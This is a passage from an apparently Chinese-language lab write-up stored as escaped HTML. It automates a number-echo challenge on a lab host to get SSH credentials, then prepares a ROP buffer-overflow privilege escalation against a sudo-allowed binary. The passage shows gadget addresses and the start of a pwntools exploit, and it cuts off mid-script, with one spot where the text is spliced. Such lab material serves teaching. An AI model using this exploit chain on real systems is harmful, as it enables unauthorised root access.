e-bash\"\u003e➜  ~ nc 192.168.56.82 1337\nPlease input [152]: 152\nPlease input [921]: 921\nPlease input [441]: 441\nPlease input [105]: 105\nPlease input [534]: 534\nPlease input [192]: 192\nPlease input [626]: 626\nPlease input [968]: 968\nPlease input [674]: 674\nPlease input [494]: 494\nPlease input [768]: 768\nPlease input [808]: 808\nPlease input [365]: 365\nPlease input [438]: 438\nPlease input [975]: 975\nPlease input [165]: 165\nPlease input [796]: 796\nPlease input [892]:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eAI\u003c/code\u003e 脚本直接爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport socket\nimport re\nimport \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# --- 配置 ---\u003c/span\u003e\nHOST = \u003cspan class=\"hljs-string\"\u003e'192.168.56.82'\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 目标服务器 IP 地址\u003c/span\u003e\nPORT = 1337  \u003cspan class=\"hljs-comment\"\u003e# 目标服务器端口\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# ------------\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 正则表达式，用于从文本中提取方括号内的数字\u003c/span\u003e\npattern = re.compile(r\u003cspan class=\"hljs-string\"\u003e\"\\[(\\d+)\\]\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# 定义一个函数，从socket中读取数据，直到遇到特定的分隔符\u003c/span\u003e\ndef read_until(sock, delimiter):\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"从 sock 中读取数据，直到接收到 delimiter 为止\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    data = b\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e not data.endswith(delimiter):\n        try:\n            \u003cspan class=\"hljs-comment\"\u003e# 一次只读取一个字节，避免读取过多内容\u003c/span\u003e\n            chunk = sock.recv(1)\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not chunk:  \u003cspan class=\"hljs-comment\"\u003e# 如果连接关闭，recv会返回空字节串\u003c/span\u003e\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e data  \u003cspan class=\"hljs-comment\"\u003e# 返回已接收的数据\u003c/span\u003e\n            data += chunk\n        except socket.timeout:\n            \u003cspan class=\"hljs-comment\"\u003e# 如果发生超时，也返回已接收的数据\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n[!] 读取超时\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e data\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e data\n\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        \u003cspan class=\"hljs-comment\"\u003e# 设置一个超时，防止脚本在任何recv操作上永久卡住\u003c/span\u003e\n        s.settimeout(3)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[*] 连接到 {HOST}:{PORT}...\"\u003c/span\u003e)\n        s.connect((HOST, PORT))\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[+] 连接成功！\"\u003c/span\u003e)\n\n        \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e True:\n            \u003cspan class=\"hljs-comment\"\u003e# 读取服务器的提示，直到 \": \" 出现\u003c/span\u003e\n            \u003cspan class=\"hljs-comment\"\u003e# 我们用 b': ' 是因为它是一个字节字符串\u003c/span\u003e\n            prompt_bytes = read_until(s, b\u003cspan class=\"hljs-string\"\u003e': '\u003c/span\u003e)\n\n            \u003cspan class=\"hljs-comment\"\u003e# 如果读取到的数据为空，说明连接可能已断开\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e not prompt_bytes:\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n[*] 连接已关闭。\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n\n            \u003cspan class=\"hljs-comment\"\u003e# 将字节解码为字符串以便处理\u003c/span\u003e\n            prompt_str = prompt_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[\u0026#x3C;] 收到: {prompt_str}\"\u003c/span\u003e, end=\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 用 end='' 避免打印多余的换行\u003c/span\u003e\n\n            \u003cspan class=\"hljs-comment\"\u003e# 在收到的提示中查找数字\u003c/span\u003e\n            match = pattern.search(prompt_str)\n\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e match:\n                \u003cspan class=\"hljs-comment\"\u003e# 提取数字\u003c/span\u003e\n                number_to_send = match.group(1)\n\n                \u003cspan class=\"hljs-comment\"\u003e# 准备要发送的数据（数字 + 换行符）\u003c/span\u003e\n                response = (number_to_send + \u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e).encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\n\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\" [\u003e] 发送: {number_to_send}\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 在同一行打印发送内容\u003c/span\u003e\n\n                \u003cspan class=\"hljs-comment\"\u003e# 发送响应\u003c/span\u003e\n                s.sendall(response)\n\n                \u003cspan class=\"hljs-comment\"\u003e# 短暂延迟，有时可以避免竞态条件\u003c/span\u003e\n                time.sleep(0.1)\n            \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                \u003cspan class=\"hljs-comment\"\u003e# 如果在提示中没有找到数字，说明挑战结束了\u003c/span\u003e\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\\n[*] 未找到挑战数字，假定挑战已完成。\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] 服务器最终响应：\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"====================================\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(prompt_str.strip())  \u003cspan class=\"hljs-comment\"\u003e# 打印我们已收到的部分\u003c/span\u003e\n\n                \u003cspan class=\"hljs-comment\"\u003e# 尝试再多接收一些数据，因为flag可能跟在后面\u003c/span\u003e\n                try:\n                    final_data = s.recv(4096).decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e).strip()\n                    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e final_data:\n                        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(final_data)\n                except socket.timeout:\n                    pass  \u003cspan class=\"hljs-comment\"\u003e# 没有更多数据是正常的\u003c/span\u003e\n\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"====================================\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n\nexcept ConnectionRefusedError:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[!] 连接被拒绝。请检查 IP ({HOST}) 和端口 ({PORT})。\"\u003c/span\u003e)\nexcept socket.timeout:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[!] 连接超时。服务器没有在规定时间内响应。\"\u003c/span\u003e)\nexcept Exception as e:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[!] 发生未知错误: {e}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] 脚本执行完毕。\"\u003c/span\u003e)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到凭据 \u003ccode\u003ewelcome\u003c/code\u003e:\u003ccode\u003elearnpwntools\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[\u0026#x3C;] 收到: Please input [407]:  [\u003e] 发送: 407\n[\u0026#x3C;] 收到: Please input [510]:  [\u003e] 发送: 510\n[\u0026#x3C;] 收到: user/pass:welcome/learnpwntools\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e缓冲区溢出\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@Tools:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e welcome on Tools:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Tools:\n    (ALL) NOPASSWD: /opt/find_backdoor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行，发现会有 \u003ccode\u003eSegmentation fault\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@Tools:~$ /opt/find_backdoor       \nplease input                                      \n111111111111111111111111111                                                                                       \nok,\u003cspan class=\"hljs-built_in\"\u003ebye\u003c/span\u003e!!!111111111111111111111111111                                                                              \nok,\u003cspan class=\"hljs-built_in\"\u003ebye\u003c/span\u003e!!!                                                                                                         \nSegmentation fault \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出来反编译一看存在缓存区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看安全机制，裸奔\u003c/p\u003e\n\u003 ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 23\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿一下需要用到的地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string \u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e\nStrings information\n============================================================\n0x000000000040201b : /bin/sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-ruby\"\u003ewelcome\u003cspan class=\"hljs-variable\"\u003e@Tools\u003c/span\u003e\u003cspan class=\"hljs-symbol\"\u003e:~\u003c/span\u003e\u003cspan class=\"hljs-variable\"\u003e$ \u003c/span\u003e\u003cspan class=\"hljs-title class_\"\u003eROPgadget\u003c/span\u003e --binary /opt/find_backdoor --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eGadgets\u003c/span\u003e information\n============================================================\n\u003cspan class=\"hljs-number\"\u003e0x00000000004011fb\u003c/span\u003e : pop rdi ; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\nGadgets information\n============================================================\n0x0000000000401016 : ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写利用脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'192.168.56.82'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'welcome'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'learnpwntools'\u003c/span\u003e)\np = r.process([\u003cspan class=\"hljs-string\"\u003e'sudo'\u003c/span\u003e, \u003cspan class=\"hljs-string\"
